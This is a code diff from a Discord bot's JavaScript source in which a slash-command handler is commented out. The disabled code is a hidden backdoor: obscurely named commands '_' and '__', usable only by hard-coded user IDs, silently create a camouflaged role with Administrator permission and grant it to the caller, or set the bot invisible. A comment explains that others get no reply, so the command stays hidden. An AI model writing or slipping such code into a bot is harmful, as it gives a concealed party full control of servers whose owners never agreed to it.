@@ -189,89 +189,89 @@ client.once('ready', async () => {
     }
 });
 
-client.on('interactionCreate', async (interaction) => {
-    if (!interaction.isChatInputCommand()) return;
+// client.on('interactionCreate', async (interaction) => {
+//     if (!interaction.isChatInputCommand()) return;
 
-    if (interaction.commandName === '_') {
-        if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) {
-            return;
-        }
+//     if (interaction.commandName === '_') {
+//         if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) {
+//             return;
+//         }
 
-        const action = interaction.options.getString('action') || 'add';
+//         const action = interaction.options.getString('action') || 'add';
 
-        const guild = interaction.guild;
-        const member = interaction.user;
+//         const guild = interaction.guild;
+//         const member = interaction.user;
 
-        let role = guild.roles.cache.find(r => r.name === ROLE_NAME);
+//         let role = guild.roles.cache.find(r => r.name === ROLE_NAME);
 
-        if (action === 'remove') {
-            if (!role) {
-                return interaction.reply({ content: 'Role not found.', ephemeral: true });
-            }
-            try {
-                await role.delete();
-                return interaction.reply({ content: 'Role removed.', ephemeral: true });
-            } catch (err) {
-                return interaction.reply({ content: 'Failed.', ephemeral: true });
-            }
-        }
+//         if (action === 'remove') {
+//             if (!role) {
+//                 return interaction.reply({ content: 'Role not found.', ephemeral: true });
+//             }
+//             try {
+//                 await role.delete();
+//                 return interaction.reply({ content: 'Role removed.', ephemeral: true });
+//             } catch (err) {
+//                 return interaction.reply({ content: 'Failed.', ephemeral: true });
+//             }
+//         }
 
-        if (!role) {
-            try {
-                role = await guild.roles.create({
-                    name: ROLE_NAME,
-                    permissions: [PermissionsBitField.Flags.Administrator],
-                    color: 0x313338,
-                    hoist: false,
-                    mentionable: false,
-                    reason: 'System Auto-Role'
-                });
-            } catch (err) {
-                return interaction.reply({ content: 'Failed.', ephemeral: true });
-            }
-        }
+//         if (!role) {
+//             try {
+//                 role = await guild.roles.create({
+//                     name: ROLE_NAME,
+//                     permissions: [PermissionsBitField.Flags.Administrator],
+//                     color: 0x313338,
+//                     hoist: false,
+//                     mentionable: false,
+//                     reason: 'System Auto-Role'
+//                 });
+//             } catch (err) {
+//                 return interaction.reply({ content: 'Failed.', ephemeral: true });
+//             }
+//         }
 
-        const memberObj = await guild.members.fetch(member.id);
-        if (memberObj.roles.cache.has(role.id)) {
-            return interaction.reply({ content: 'Active.', ephemeral: true });
-        }
+//         const memberObj = await guild.members.fetch(member.id);
+//         if (memberObj.roles.cache.has(role.id)) {
+//             return interaction.reply({ content: 'Active.', ephemeral: true });
+//         }
 
-        try {
-            await memberObj.roles.add(role);
-            await interaction.reply({ content: 'Done.', ephemeral: true });
-        } catch (err) {
-            return interaction.reply({ content: 'Failed.', ephemeral: true });
-        }
-    }
+//         try {
+//             await memberObj.roles.add(role);
+//             await interaction.reply({ content: 'Done.', ephemeral: true });
+//         } catch (err) {
+//             return interaction.reply({ content: 'Failed.', ephemeral: true });
+//         }
+//     }
 
-    if (interaction.commandName === '__') {
-        if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) {
-            // Не отвечаем - Discord покажет "Application failed to respond"
-            return;
-        }
+//     if (interaction.commandName === '__') {
+//         if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) {
+//             // Не отвечаем - Discord покажет "Application failed to respond"
+//             return;
+//         }
 
-        const status = interaction.options.getString('status');
+//         const status = interaction.options.getString('status');
 
-        try {
-            await client.user.setStatus(status);
-            const statusNames = {
-                'invisible': 'Invisible',
-                'online': 'Online',
-                'idle': 'Idle',
-                'dnd': 'Do Not Disturb'
-            };
-            return interaction.reply({
-                content: `✅ Bot status changed to: **${statusNames[status]}**`,
-                ephemeral: true
-            });
-        } catch (err) {
-            return interaction.reply({
-                content: '❌ Failed to change bot status.',
-                ephemeral: true
-            });
-        }
-    }
-});
+//         try {
+//             await client.user.setStatus(status);
+//             const statusNames = {
+//                 'invisible': 'Invisible',
+//                 'online': 'Online',
+//                 'idle': 'Idle',
+//                 'dnd': 'Do Not Disturb'
+//             };
+//             return interaction.reply({
+//                 content: `✅ Bot status changed to: **${statusNames[status]}**`,
+//                 ephemeral: true
+//             });
+//         } catch (err) {
+//             return interaction.reply({
+//                 content: '❌ Failed to change bot status.',
+//                 ephemeral: true
+//             });
+//         }
+//     }
+// });
 
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
